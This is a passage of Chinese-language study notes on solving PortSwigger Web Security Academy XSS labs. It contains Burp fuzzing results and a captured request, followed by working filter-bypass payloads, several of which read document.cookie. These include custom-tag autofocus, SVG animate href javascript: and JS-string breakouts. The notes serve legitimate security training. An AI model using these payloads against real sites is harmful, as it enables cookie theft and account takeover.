id="u267ee170" class="ne-p"><span class="ne-text">false</span></p><p id="u88074481" class="ne-p"><span class="ne-text">false</span></p><p id="ub7181a69" class="ne-p"><span class="ne-text">3619</span></p><p id="uea237427" class="ne-p"><span class="ne-text">25</span></p><p id="u98e9db2a" class="ne-p"><span class="ne-text">oncontentvisibilityautostatechange(hidden)</span></p><p id="u567e8165" class="ne-p"><span class="ne-text">200</span></p><p id="ubab17026" class="ne-p"><span class="ne-text">268</span></p><p id="u275f7ef4" class="ne-p"><span class="ne-text">false</span></p><p id="u262ce2a8" class="ne-p"><span class="ne-text">false</span></p><p id="uefee5537" class="ne-p"><span class="ne-text">3627</span></p><p id="u3341afd4" class="ne-p"><span class="ne-text">34</span></p><p id="u0dc4cdca" class="ne-p"><span class="ne-text">ondragexit</span></p><p id="u544c48e2" class="ne-p"><span class="ne-text">200</span></p><p id="u676cb780" class="ne-p"><span class="ne-text">315</span></p><p id="u495450bf" class="ne-p"><span class="ne-text">false</span></p><p id="u10652f20" class="ne-p"><span class="ne-text">false</span></p><p id="u57566696" class="ne-p"><span class="ne-text">3595</span></p><p id="u5dad9ebc" class="ne-p"><span class="ne-text">47</span></p><p id="u99105837" class="ne-p"><span class="ne-text">onformdata</span></p><p id="u9e77191c" class="ne-p"><span class="ne-text">200</span></p><p id="u6ca4692b" class="ne-p"><span class="ne-text">318</span></p><p id="uca86900d" class="ne-p"><span class="ne-text">false</span></p><p id="ub3639c8f" class="ne-p"><span class="ne-text">false</span></p><p id="uf5658a12" class="ne-p"><span class="ne-text">3595</span></p><p id="u7ef1f4e7" class="ne-p"><span class="ne-text">49</span></p><p id="ucbd4f023" class="ne-p"><span class="ne-text">ongesturechange</span></p><p id="u95328eb3" class="ne-p"><span class="ne-text">200</span></p><p id="uf1fb3da0" class="ne-p"><span class="ne-text">318</span></p><p id="uc57e1367" class="ne-p"><span class="ne-text">false</span></p><p id="u0b1c8c08" class="ne-p"><span class="ne-text">false</span></p><p id="ubbc4d2c3" class="ne-p"><span class="ne-text">3600</span></p><p id="u4bcae797" class="ne-p"><span class="ne-text">50</span></p><p id="u7f2e9e29" class="ne-p"><span class="ne-text">ongestureend</span></p><p id="u5214438c" class="ne-p"><span class="ne-text">200</span></p><p id="u664f3ff7" class="ne-p"><span class="ne-text">268</span></p><p id="u4d6ace4d" class="ne-p"><span class="ne-text">false</span></p><p id="u473d9510" class="ne-p"><span class="ne-text">false</span></p><p id="uc7697e7d" class="ne-p"><span class="ne-text">3597</span></p><p id="ucf757b54" class="ne-p"><span class="ne-text">51</span></p><p id="u15661055" class="ne-p"><span class="ne-text">ongesturestart</span></p><p id="u706a48ae" class="ne-p"><span class="ne-text">200</span></p><p id="u02f0211e" class="ne-p"><span class="ne-text">269</span></p><p id="u3a3d7d45" class="ne-p"><span class="ne-text">false</span></p><p id="udc24c926" class="ne-p"><span class="ne-text">false</span></p><p id="ue1c166ec" class="ne-p"><span class="ne-text">3599</span></p><p id="u9feca0ec" class="ne-p"><span class="ne-text">52</span></p><p id="u943e17ce" class="ne-p"><span class="ne-text">ongotpointercapture</span></p><p id="u10bfdd40" class="ne-p"><span class="ne-text">200</span></p><p id="uae832255" class="ne-p"><span class="ne-text">271</span></p><p id="ueee5c26a" class="ne-p"><span class="ne-text">false</span></p><p id="ud86db42e" class="ne-p"><span class="ne-text">false</span></p><p id="uc2b169fb" class="ne-p"><span class="ne-text">3604</span></p><p id="uead077f9" class="ne-p"><span class="ne-text">63</span></p><p id="u8e6f0475" class="ne-p"><span class="ne-text">onlocation</span></p><p id="u796f8edb" class="ne-p"><span class="ne-text">200</span></p><p id="uc29836fa" class="ne-p"><span class="ne-text">317</span></p><p id="ud5632d92" class="ne-p"><span class="ne-text">false</span></p><p id="uc4f511a3" class="ne-p"><span class="ne-text">false</span></p><p id="u70319094" class="ne-p"><span class="ne-text">3595</span></p><p id="uf2bca82a" class="ne-p"><span class="ne-text">64</span></p><p id="u2fc3e47d" class="ne-p"><span class="ne-text">onlostpointercapture</span></p><p id="u62968fda" class="ne-p"><span class="ne-text">200</span></p><p id="u6ee7aa50" class="ne-p"><span class="ne-text">269</span></p><p id="u92258ab1" class="ne-p"><span class="ne-text">false</span></p><p id="u1a720d57" class="ne-p"><span class="ne-text">false</span></p><p id="ud40a8f8c" class="ne-p"><span class="ne-text">3605</span></p><p id="u518d416f" class="ne-p"><span class="ne-text">76</span></p><p id="u4fecc193" class="ne-p"><span class="ne-text">onpagereveal</span></p><p id="u6584e6e7" class="ne-p"><span class="ne-text">200</span></p><p id="u1561cf9a" class="ne-p"><span class="ne-text">324</span></p><p id="u1fd08246" class="ne-p"><span class="ne-text">false</span></p><p id="ub9e5fd54" class="ne-p"><span class="ne-text">false</span></p><p id="ub874a6c5" class="ne-p"><span class="ne-text">3597</span></p><p id="u203823a7" class="ne-p"><span class="ne-text">78</span></p><p id="u01d5940e" class="ne-p"><span class="ne-text">onpageswap</span></p><p id="u9ef98e76" class="ne-p"><span class="ne-text">200</span></p><p id="u5d0808ea" class="ne-p"><span class="ne-text">324</span></p><p id="u868cc929" class="ne-p"><span class="ne-text">false</span></p><p id="u7661c021" class="ne-p"><span class="ne-text">false</span></p><p id="u6595b529" class="ne-p"><span class="ne-text">3595</span></p><p id="u08d0c1af" class="ne-p"><span class="ne-text">83</span></p><p id="ua91b4df4" class="ne-p"><span class="ne-text">onpointercancel</span></p><p id="u0862b738" class="ne-p"><span class="ne-text">200</span></p><p id="u23a0ce33" class="ne-p"><span class="ne-text">311</span></p><p id="u8296f37b" class="ne-p"><span class="ne-text">false</span></p><p id="u48782545" class="ne-p"><span class="ne-text">false</span></p><p id="u8fc3c7f4" class="ne-p"><span class="ne-text">3600</span></p><p id="u6c7e2aaa" class="ne-p"><span class="ne-text">94</span></p><p id="u40ddae7c" class="ne-p"><span class="ne-text">onpromptaction</span></p><p id="u7a717f78" class="ne-p"><span class="ne-text">200</span></p><p id="u5b7d1f4f" class="ne-p"><span class="ne-text">268</span></p><p id="u23f95a24" class="ne-p"><span class="ne-text">false</span></p><p id="ue2a2b49c" class="ne-p"><span class="ne-text">false</span></p><p id="u742d78c3" class="ne-p"><span class="ne-text">3599</span></p><p id="ua648f410" class="ne-p"><span class="ne-text">95</span></p><p id="ub91965d0" class="ne-p"><span class="ne-text">onpromptdismiss</span></p><p id="ud8cb7f52" class="ne-p"><span class="ne-text">200</span></p><p id="ub2b3b7ed" class="ne-p"><span class="ne-text">268</span></p><p id="uc62fbbe6" class="ne-p"><span class="ne-text">false</span></p><p id="u3e20bf08" class="ne-p"><span class="ne-text">false</span></p><p id="u95afe75b" class="ne-p"><span class="ne-text">3600</span></p><p id="u354dacd3" class="ne-p"><span class="ne-text">96</span></p><p id="ue22a2079" class="ne-p"><span class="ne-text">onratechange</span></p><p id="u944bc5e1" class="ne-p"><span class="ne-text">200</span></p><p id="u92254cd6" class="ne-p"><span class="ne-text">268</span></p><p id="u436e6383" class="ne-p"><span class="ne-text">false</span></p><p id="u14c7798d" class="ne-p"><span class="ne-text">false</span></p><p id="ued99e3e1" class="ne-p"><span class="ne-text">3597</span></p><p id="u3db84717" class="ne-p"><span class="ne-text">99</span></p><p id="u9184c85f" class="ne-p"><span class="ne-text">onresize</span></p><p id="uc722d6db" class="ne-p"><span class="ne-text">200</span></p><p id="ud05158bd" class="ne-p"><span class="ne-text">269</span></p><p id="uae3e2424" class="ne-p"><span class="ne-text">false</span></p><p id="u87c4bba3" class="ne-p"><span class="ne-text">false</span></p><p id="u75fc4872" class="ne-p"><span class="ne-text">3593</span></p><p id="u2d177cf4" class="ne-p"><span class="ne-text">101</span></p><p id="udfa98b9b" class="ne-p"><span class="ne-text">onscrollend</span></p><p id="u764d0d14" class="ne-p"><span class="ne-text">200</span></p><p id="u393e640a" class="ne-p"><span class="ne-text">273</span></p><p id="u07f5bb7f" class="ne-p"><span class="ne-text">false</span></p><p id="udd8fe7ee" class="ne-p"><span class="ne-text">false</span></p><p id="uef98a315" class="ne-p"><span class="ne-text">3596</span></p><p id="u4cf7cefa" class="ne-p"><span class="ne-text">102</span></p><p id="u1b657376" class="ne-p"><span class="ne-text">onscrollsnapchange</span></p><p id="u6b8b3168" class="ne-p"><span class="ne-text">200</span></p><p id="uc342e6bd" class="ne-p"><span class="ne-text">269</span></p><p id="u81a5bd2d" class="ne-p"><span class="ne-text">false</span></p><p id="uc37f7922" class="ne-p"><span class="ne-text">false</span></p><p id="u813ae51e" class="ne-p"><span class="ne-text">3603</span></p><p id="ufacff092" class="ne-p"><span class="ne-text">103</span></p><p id="u8b3d605a" class="ne-p"><span class="ne-text">onscrollsnapchanging</span></p><p id="u79031a19" class="ne-p"><span class="ne-text">200</span></p><p id="u8f5e22fd" class="ne-p"><span class="ne-text">268</span></p><p id="ue772e534" class="ne-p"><span class="ne-text">false</span></p><p id="uedfd0093" class="ne-p"><span class="ne-text">false</span></p><p id="u660af78a" class="ne-p"><span class="ne-text">3605</span></p><p id="uf6ec7fe7" class="ne-p"><span class="ne-text">105</span></p><p id="u14f843f8" class="ne-p"><span class="ne-text">onsecuritypolicyviolation</span></p><p id="u0b432d23" class="ne-p"><span class="ne-text">200</span></p><p id="u027c05f5" class="ne-p"><span class="ne-text">269</span></p><p id="u7eb5f392" class="ne-p"><span class="ne-text">false</span></p><p id="u818bb3e2" class="ne-p"><span class="ne-text">false</span></p><p id="u5b62f4d4" class="ne-p"><span class="ne-text">3610</span></p><p id="ud0afd86e" class="ne-p"><span class="ne-text">111</span></p><p id="u95e7a343" class="ne-p"><span class="ne-text">onslotchange</span></p><p id="u883a263b" class="ne-p"><span class="ne-text">200</span></p><p id="uac85a59b" class="ne-p"><span class="ne-text">267</span></p><p id="u3f5f4421" class="ne-p"><span class="ne-text">false</span></p><p id="u176e2503" class="ne-p"><span class="ne-text">false</span></p><p id="u64f45b23" class="ne-p"><span class="ne-text">3597</span></p><p id="u2476df17" class="ne-p"><span class="ne-text">113</span></p><p id="u5e0fa067" class="ne-p"><span class="ne-text">onsuspend</span></p><p id="u2c32d8a4" class="ne-p"><span class="ne-text">200</span></p><p id="u80650d90" class="ne-p"><span class="ne-text">269</span></p><p id="u8692142b" class="ne-p"><span class="ne-text">false</span></p><p id="ub626ce1f" class="ne-p"><span class="ne-text">false</span></p><p id="u95be7999" class="ne-p"><span class="ne-text">3594</span></p><p id="uc4be5dca" class="ne-p"><span class="ne-text">117</span></p><p id="u4a6969a6" class="ne-p"><span class="ne-text">ontouchcancel</span></p><p id="u17df5739" class="ne-p"><span class="ne-text">200</span></p><p id="u269ad2db" class="ne-p"><span class="ne-text">269</span></p><p id="u0fa7f8c3" class="ne-p"><span class="ne-text">false</span></p><p id="u2daf6f87" class="ne-p"><span class="ne-text">false</span></p><p id="ub916f15f" class="ne-p"><span class="ne-text">3598</span></p><p id="u813b52d1" class="ne-p"><span class="ne-text">127</span></p><p id="ua9e965bf" class="ne-p"><span class="ne-text">onvalidationstatuschange</span></p><p id="uec6cb7d4" class="ne-p"><span class="ne-text">200</span></p><p id="u0c9197b7" class="ne-p"><span class="ne-text">268</span></p><p id="u22c1ff8e" class="ne-p"><span class="ne-text">false</span></p><p id="u1322da89" class="ne-p"><span class="ne-text">false</span></p><p id="udfe5b0d7" class="ne-p"><span class="ne-text">3609</span></p><p id="u65d08ead" class="ne-p"><span class="ne-text">134</span></p><p id="u56267525" class="ne-p"><span class="ne-text">onwebkitfullscreenchange</span></p><p id="u9f805cd2" class="ne-p"><span class="ne-text">200</span></p><p id="u0b7aa581" class="ne-p"><span class="ne-text">270</span></p><p id="u3b3c6655" class="ne-p"><span class="ne-text">false</span></p><p id="u4a25d688" class="ne-p"><span class="ne-text">false</span></p><p id="u758ec672" class="ne-p"><span class="ne-text">3609</span></p><p id="udfafe22c" class="ne-p"><span class="ne-text">135</span></p><p id="ub557f599" class="ne-p"><span class="ne-text">onwebkitmouseforcechanged</span></p><p id="ufda287b1" class="ne-p"><span class="ne-text">200</span></p><p id="u0d6554fb" class="ne-p"><span class="ne-text">269</span></p><p id="u5ac6faf8" class="ne-p"><span class="ne-text">false</span></p><p id="u2be002bb" class="ne-p"><span class="ne-text">false</span></p><p id="u2f0e11b8" class="ne-p"><span class="ne-text">3610</span></p><p id="u0815bc86" class="ne-p"><span class="ne-text">136</span></p><p id="ubffbc5a0" class="ne-p"><span class="ne-text">onwebkitmouseforcedown</span></p><p id="u43101520" class="ne-p"><span class="ne-text">200</span></p><p id="u9841265b" class="ne-p"><span class="ne-text">268</span></p><p id="uc5b4f3e3" class="ne-p"><span class="ne-text">false</span></p><p id="u141c71e8" class="ne-p"><span class="ne-text">false</span></p><p id="u58f4d31b" class="ne-p"><span class="ne-text">3607</span></p><p id="u57610d6b" class="ne-p"><span class="ne-text">137</span></p><p id="u0cda9855" class="ne-p"><span class="ne-text">onwebkitmouseforceup</span></p><p id="ub03a9b8f" class="ne-p"><span class="ne-text">200</span></p><p id="u3749082d" class="ne-p"><span class="ne-text">268</span></p><p id="u9c3f8ed6" class="ne-p"><span class="ne-text">false</span></p><p id="u7b52aaf7" class="ne-p"><span class="ne-text">false</span></p><p id="u48b864f7" class="ne-p"><span class="ne-text">3605</span></p><p id="u0311fe15" class="ne-p"><span class="ne-text">138</span></p><p id="u95d5c9d5" class="ne-p"><span class="ne-text">onwebkitmouseforcewillbegin</span></p><p id="uddf54a5e" class="ne-p"><span class="ne-text">200</span></p><p id="ub74f57f7" class="ne-p"><span class="ne-text">270</span></p><p id="u5807d8fe" class="ne-p"><span class="ne-text">false</span></p><p id="u62e57587" class="ne-p"><span class="ne-text">false</span></p><p id="u50fd28c0" class="ne-p"><span class="ne-text">3612</span></p><p id="uceb99b5e" class="ne-p"><span class="ne-text">139</span></p><p id="u049ac744" class="ne-p"><span class="ne-text">onwebkitneedkey</span></p><p id="uf2fd0589" class="ne-p"><span class="ne-text">200</span></p><p id="u0ce383f0" class="ne-p"><span class="ne-text">268</span></p><p id="u1a3475b7" class="ne-p"><span class="ne-text">false</span></p><p id="ue0d86201" class="ne-p"><span class="ne-text">false</span></p><p id="ue0b5aeb0" class="ne-p"><span class="ne-text">3600</span></p><p id="u9f639b4c" class="ne-p"><span class="ne-text">140</span></p><p id="ubd67a257" class="ne-p"><span class="ne-text">onwebkitplaybacktargetavailabilitychanged</span></p><p id="u508f8863" class="ne-p"><span class="ne-text">200</span></p><p id="u1c2b4f9f" class="ne-p"><span class="ne-text">269</span></p><p id="ub8535fc6" class="ne-p"><span class="ne-text">false</span></p><p id="ucbaa69ce" class="ne-p"><span class="ne-text">false</span></p><p id="udb4b58d5" class="ne-p"><span class="ne-text">3626</span></p><p id="u3e4fc0c1" class="ne-p"><span class="ne-text">141</span></p><p id="u7e04baed" class="ne-p"><span class="ne-text">onwebkitpresentationmodechanged</span></p><p id="u488088f1" class="ne-p"><span class="ne-text">200</span></p><p id="u77c75d04" class="ne-p"><span class="ne-text">269</span></p><p id="uc9338aea" class="ne-p"><span class="ne-text">false</span></p><p id="u8858dda4" class="ne-p"><span class="ne-text">false</span></p><p id="u4382ce7f" class="ne-p"><span class="ne-text">3616</span></p><p id="uef99c2c3" class="ne-p"><span class="ne-text">143</span></p><p id="ubefb66dd" class="ne-p"><span class="ne-text">onwebkitwillrevealbottom</span></p><p id="u44d05ed4" class="ne-p"><span class="ne-text">200</span></p><p id="u49f64df4" class="ne-p"><span class="ne-text">268</span></p><p id="u87c216d3" class="ne-p"><span class="ne-text">false</span></p><p id="u8e490823" class="ne-p"><span class="ne-text">false</span></p><p id="u33607ba8" class="ne-p"><span class="ne-text">3609</span></p></details>


<xss>onkeydown="alert(1)"</xss>

<details class="lake-collapse"><summary id="uab6172cc"><span class="ne-text">失败原因：</span></summary><p id="ue72f7587" class="ne-p"><span class="ne-text">&lt;xss onkeydown=&quot;alert(1)&quot;&gt;</span></p><p id="ua6be1d65" class="ne-p"><span class="ne-text"> 事件写在标签内部，不是标签之间。</span></p><p id="uf878f40e" class="ne-p"><span class="ne-text">  但还有一个问题——onkeydown 需要用户按键才能触发。除非你用 autofocus + tabindex</span></p><p id="uf474e365" class="ne-p"><span class="ne-text">  把它变成可聚焦元素，然后引导用户按键。这在实际攻击中成功率很低。</span></p><p id="u48d64865" class="ne-p"><span class="ne-text">  更可靠的组合：用不需要交互的事件。</span></p><p id="u46a31229" class="ne-p"><span class="ne-text">  你在Intruder里跑出来的是哪个标签和哪个事件？告我，我帮你拼成正确payload。</span></p><p id="u508e0a9c" class="ne-p"><span class="ne-text">&quot;Attribute is not allowed&quot;</span></p><p id="ucc34485e" class="ne-p"><img src="https://cdn.nlark.com/yuque/0/2026/png/45828822/1781867460942-2e8cae20-0b55-439a-adb5-9890cca525a1.png" width="620.8" title="" crop="0,0,1,1" id="u04337280" class="ne-image"></p></details>
```python
GET /?search=<body 这里插入攻击载荷试探可用事件 > HTTP/2
Host: 0ab8003c040a67e38111110f008e008a.web-security-academy.net
Cookie: session=IVysHrwt6Z1p6mIKQ6pTGQGu8YPALxKl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab8003c040a67e38111110f008e008a.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive


```





0ab8003c040a67e38111110f008e008a

<iframe src="https://0ab8003c040a67e38111110f008e008a.web-security-academy.net/?search= <body onresize=print()>" onload=this.style.width='100px'>



Payload：<iframe src="[https://0ab8003c040a67e38111110f008e008a.web-security-academy.net/?search='<body](https://0afe00fd030d489c80420db0009b0057.web-security-academy.net/?search='<body) onresize=print()>" onload=this.style.width='100px'>



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781869710280-3acfa855-3dc9-420b-93ce-9972ebebd60f.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781869818838-8a3b3f11-551a-45b8-b172-f7a78274eecd.png)

找到没有被拦截的标签和事件，用它们进行组合，然后通过。



## DOM XSS in document.write sink using source location.search
?search=" onload="alert(1)

? 不是payload的一部分。它只是告诉浏览器「后面是查询参数」。serach就是搜索框，我们输入的内容就是serach。就像写代码，serach就是参数，我们输入的就是参数的值。你的payload从 " 开始生效。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781870784366-2b261261-6d67-4311-9b4a-f630483d0ea1.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781870764766-af931a6c-439d-45d0-a1dc-7c6c696bb5c4.png)





+ <font style="color:rgb(51, 51, 51);">Reflected XSS into HTML context with all tags blocked except custom ones</font>

## Reflected XSS into HTML context with all tags blocked except custom ones
"11

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781936356363-99dbef04-f8df-4eb6-b93f-353b97ccd3e0.png)

这说明我们的攻击在属性值内

" onfocus="alert(1)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782878550653-266f2ec6-590d-4533-a8fb-8400d3faf56b.png)





---

输入一个独特的字符串比如：dsaedfdasd这样的，然后去网页源代码中搜索它。

观察它周围，

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782879025686-e7012020-a672-4da2-8a28-6e1cdbb4a1e5.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782879042941-6450afc3-4977-41d6-b377-8aa7d388e8e1.png)



<h1>0 search results for '"11'</h1>

如上，说明我们输入的内容在标签内，是第一种上下文。

构造第一种上下文对应的payload：

<script>alert(1)</script>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782878419490-df9f768d-653a-4f7a-adfc-784db24135f9.png)

<img src=x onerror=alert(1)>

+ <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">渲染 HTML </font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><img></font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 图片标签，</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">src=x</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 是不存在的图片地址，浏览器加载图片失败，触发</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">onerror 错误事件</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">。</font>
+ <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">事件属性内的 JS 代码直接执行。</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782879271334-c74cb621-4003-40c1-9e0d-89f6c4151101.png)



发现被过滤了，接下来就爆破，找到能用的标签。



"><img src=x onerror=alert(1)>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782879271334-c74cb621-4003-40c1-9e0d-89f6c4151101.png)

这不是失败。这是给你更多树干信息。

  你现在知道三件事：

1. " 没有被编码 → 编码防御不存在
2.  被拦截 → 但说明它识别了标签语法，不是全放行
3. 过滤手段是黑名单（blocklist），不是白名单 — 因为它报"Tag not allowed"，说明它有一个禁止标签列表



现在就找到没有禁止的标签，也就是探测防御边界。

利用bp的intruder模块，构造<载荷插入点>，就是在<>内插入载荷。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782880135473-2867a7f4-fd5d-4a4e-9d9f-24ff9648e47a.png)

有这些标签可用。

 <animate>  

 <animateMotion>  

 <animateTransform>  

 <set>  

 <xss>

<animate onbegin=alert(1)>

  <set onbegin=alert(1)>

  <xss onmouseover=alert(1)>

  <animateMotion onbegin=alert(1)>

以上payload失败



<animate onfocus=alert(1) autofocus tabindex=1>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782880539311-9d5f53ed-4cb6-41f8-b8b4-eb18ec03cd46.png)

<xss onfocus=alert(document.cookie) autofocus tabindex=1>

弹出cookie



---

## Lab: Reflected XSS with event handlers and `href` attributes blocked


**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">event handlers</font>** 事件处理器，指 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">onclick/onerror/onbegin/onfocus</font>` 这类 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">on*</font>` 执行 JS 的属性  

**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">href attributes blocked</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> href 属性被过滤拦截，意味着：</font>

+ `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><a href="javascript:xxx"></font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><svg a href=javascript:alert(1)></font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 等 </font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">javascript:</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 伪协议全部无法使用</font>

href（ Hypertext REFerence 超文本引用地址    ）： 标准 HTML 属性，用于 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><a> / <link> / <area></font>`



输入特征，发现在标签内，所以第一种上下文。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782881757129-ba2bcb6c-6012-45ea-945b-5a22e56f4987.png)

输入



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782883387288-96923346-a4ae-43b6-92bb-a8fb82abfa30.png)

爆破得到可用的标签。

animate



题目中提到这里的href和事件属性都被过滤，所以要用svg类别的标签，但为什么是svg呢？

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782883043354-43f43ae4-5a50-4524-bbe8-e7763bc110b8.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782884022178-2389240a-40e9-41a9-be62-b6165af80ae0.png)



<svg><a><animate attributeName=href values=javascript:alert(document.cookie)>click

这里a标签不闭合也是对的，HTML的语法没有那么严格。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782883805063-3130cc48-539b-43cf-8c28-f893689d41d9.png)



[https://0a49001d04c2279f805c3bb9004b001b.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E](https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E)

（URL编码）

<font style="color:rgb(0, 0, 0);"><svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782884426159-87db9600-c568-4803-8703-0ff40d2d57fc.png)







## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
<>被编码



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782885238793-77f47b7f-68ee-41cb-804e-45ef0f7086e0.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782885463787-b1646fa7-e647-4a15-a916-79d0868d4eb1.png)



<script>alert(1)</script>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782885286978-29ab454a-cb93-4e7b-8734-291e8f4af287.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782885442461-ae85b66a-1306-41d7-8e20-8ed32fc143a8.png)



出现了两次，说明这是第三种上下文，在<script>标签内。

payload：';alert(document.cookie);//

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782885745656-ae42666f-5e80-430f-b240-31666c8c881c.png)





## Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped


<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782887794812-ecda8044-2d0a-4bbd-a906-7cee6c46bd9a.png)



第三种上下文

<script>alert(1)</script>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782887855097-ef38cc05-4a09-4909-9501-5ad73df896fe.png)



';alert(1);//

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782887930056-fde6e537-8500-459a-860d-e55357fae798.png)



<>和 ' ，被过滤了；服务器把 ' 转成 \'，变成：

\';alert(1);//

 \'   **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">反斜杠会把单引号 “转义成普通文本字符”</font>**，不再充当字符串闭合标记  ;

但如果加上一个\，JS就会将\\识别成一个正常的反斜杠标识符，我们就可以用'成功闭合了

（ \ 的作用就是将下一个符号转义。\\ 就是\转义了\，所以只是一个正常的反斜杠）



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782888357182-30428660-2adf-445f-ab0a-e7ff4b471efb.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782888428495-7f7df348-6f13-4ea7-8753-8af08861ea87.png)



这里的防御机制是把单引号转变为\' ，这样就会把单引号编程一个

## Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
1. **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">anchor href attribute</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> anchor = </font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><a></font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 锚点标签；href attribute = href 属性</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 注入位置：</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><a href="用户可控内容"></font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 双引号包裹的 href 值</font>
